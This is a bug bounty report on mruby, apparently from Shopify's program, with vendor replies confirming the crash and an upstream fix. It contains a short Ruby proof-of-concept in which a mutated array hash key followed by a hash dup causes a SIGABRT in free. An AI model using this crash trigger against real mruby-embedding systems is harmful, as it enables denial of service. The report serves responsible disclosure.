title: SIGABRT - in free
vulnerability_information:
PoC
-------------------

The following code triggers the bug (attached as free.rb):

	a=[]
	h={""=>0}
	h[[a,"h00000000h[0000]00=0000000
	0000h[t]00000=00t0000
	0000h[000]000=000000
	00000"]]=0
	a[0]="z"
	h[[a,"h00000000h[0000]00=0000000
	0000h[t]00000=00t0000
	0000h[000]000=000000
	00000"]]=0
	h.dup

-------------------

activities.message:
Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.

Due to the large volume of reports we have received, it may take us up to two weeks to respond. Thank you for your patience!
Thank you for your report. We've reproduced the crash and opened an issue upstream: https://github.com/mruby/mruby/issues/3562

Thanks again for your report. This issue was addressed upstream in https://github.com/mruby/mruby/commit/a6e25f73a05bb0292c0c9f10b77c5cdaf260e4d0.

Our next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.
Thanks for helping improve the security of Shopify and the MRuby project!
